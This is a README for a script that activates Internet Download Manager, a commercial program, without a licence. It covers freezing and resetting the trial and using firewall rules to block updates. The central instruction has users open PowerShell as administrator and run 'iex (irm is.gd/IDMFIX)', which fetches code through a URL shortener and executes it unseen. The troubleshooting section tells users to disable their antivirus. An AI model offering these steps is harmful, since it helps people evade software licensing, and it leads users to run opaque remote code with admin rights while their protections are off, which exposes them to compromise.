# IDM Activation Script (IAS)

**Final v3.7** | An open-source tool to activate, freeze, reset, and firewall-block **Internet Download Manager (IDM)**.

---

## 🚨 Disclaimer

This script is provided for educational purposes. All credit for the original research and code goes to the original authors and contributors. This project is a continuation and enhancement of their work.

* **Original Forum Post:** [nsaneforums.com](https://www.nsaneforums.com/topic/371047--/?do=findComment&comment=1578647)
* **Original GitHub:** [github.com/WindowsAddict/IDM-Activation-Script](https://github.com/WindowsAddict/IDM-Activation-Script)

---

## How to Reset, Freeze, Activate, and Block Updates for IDM Using PowerShell

Follow these steps to use the **IDM Activation Script (IAS) v3.7** to manage an expired IDM trial. The process involves running the script via PowerShell as Administrator and following a specific sequence of actions for the best results.

### Prerequisites

* **IDM Installed**: Ensure IDM is installed (download from [www.internetdownloadmanager.com](https://www.internetdownloadmanager.com) if needed).
* **PowerShell Access**: You need PowerShell (available by default on Windows 7/8/8.1/10/11).
* **Administrator Privileges**: PowerShell must be run as Administrator to modify registry and firewall settings.

### Step-by-Step Instructions

#### Step 1: Run PowerShell as Administrator

1.  Press `Windows key + S`, type **PowerShell**, right-click **Windows PowerShell**, and select **Run as administrator**.
2.  Alternatively, open **Windows Terminal** as Administrator and switch to the PowerShell tab.

#### Step 2: Execute the IAS Script

1.  In the PowerShell window, paste and run the following command:
    ```powershell
    iex (irm is.gd/IDMFIX)
    ```
2.  This downloads and executes the `IAS.cmd` script (v3.7) from the GitHub repository.
3.  A command prompt window will open displaying the IAS menu:
    ```
    IDM Activation Script 3.7
    ___________________________________________________
    Telegram: @theblindsinner1
    Github: [https://github.com/Blindsinner]
    ___________________________________________________
    [1] Activate
    [2] Freeze Trial
    [3] Reset Activation / Trial
    [4] Block IDM Updates (Firewall)
    [5] Unblock IDM Updates (Firewall)
    [6] Download IDM
    [7] Help
    [0] Exit
    ___________________________________________________
    Enter a menu option in the Keyboard [1-7,0]
    ```

#### Step 3: Follow the Correct Workflow

The steps you take next depend on whether this is a fresh installation or an expired trial.

### Workflow 1: First-Time IDM Installation

If you have just installed IDM and have not used the trial, the process is simple.

1.  **Activate**: In the IAS menu, type `1` and press Enter. It should succeed on the first try.
2.  **Block Updates**: After activation, return to the menu and type `4` to select **Block IDM Updates (Firewall)**.
3.  **Exit**: Type `0` to exit. Your IDM is now activated.

### Workflow 2: Expired Trial or Re-Activating

If your IDM trial has expired or a previous activation has failed, you must follow this specific sequence for it to work correctly.

1.  **Reset IDM Trial**: In the IAS menu, type `3` and press Enter. This cleans out any old data. Press any key to return to the menu.
2.  **Freeze the Trial**: Type `2` and press Enter. Press any key to return to the menu.
3.  **Activate (First Attempt - Expected to Fail)**: Type `1` and press Enter. The script may show an error or the activation might not seem to work. This is expected. Press any key to return to the menu.
4.  **Activate (Second Attempt - Will Succeed)**: Type `1` and press Enter again. This time, the activation process will complete successfully. Press any key to return to the menu.
5.  **Block Updates (Twice)**: This is a critical step.
    * Type `4` and press Enter.
    * After it returns to the menu, type `4` and press Enter a second time to ensure the rule is firmly in place.
6.  **Verify and Exit**: You can now open IDM and go to **Help -> Check for updates...**. It should fail to connect, confirming the block is working. In the script menu, type `0` to exit.

---

### Important Notes & Troubleshooting

* **PNG Downloads**: The script downloads safe PNG files from `www.internetdownloadmanager.com` to create registry keys. These are deleted after use and are not malware.
* **Activation Still Fails**: If the process doesn't work, a third-party antivirus or firewall (e.g., Kaspersky, Bitdefender) is likely interfering. Temporarily disable it and repeat the steps for your scenario.
* **Firewall Block Disappears**: Sometimes, a major Windows Update or another security program can reset firewall rules. If IDM suddenly says it's not activated, the firewall block is the most likely cause.
    * **Solution**: Simply run the script again as administrator and choose **Option [4] Block IDM Updates (Firewall)** two times. This will re-apply the block and should fix the issue immediately.
* **Unblocking Updates**: To update IDM, run the script and choose **Option [5] Unblock IDM Updates (Firewall)**. After updating, you must repeat the full activation process from **Workflow 2**.

---

### Example Workflow (For Expired Trial)

1.  Run PowerShell as Administrator, execute `iex (irm is.gd/IDMFIX)`.
2.  In the IAS menu, select **3) Reset Activation / Trial**.
3.  Select **2) Freeze Trial**.
4.  Select **1) Activate** (it may fail, this is normal).
5.  Select **1) Activate** again (it will now succeed).
6.  Select **4) Block IDM Updates** two times to finish.
7.  Exit and verify.
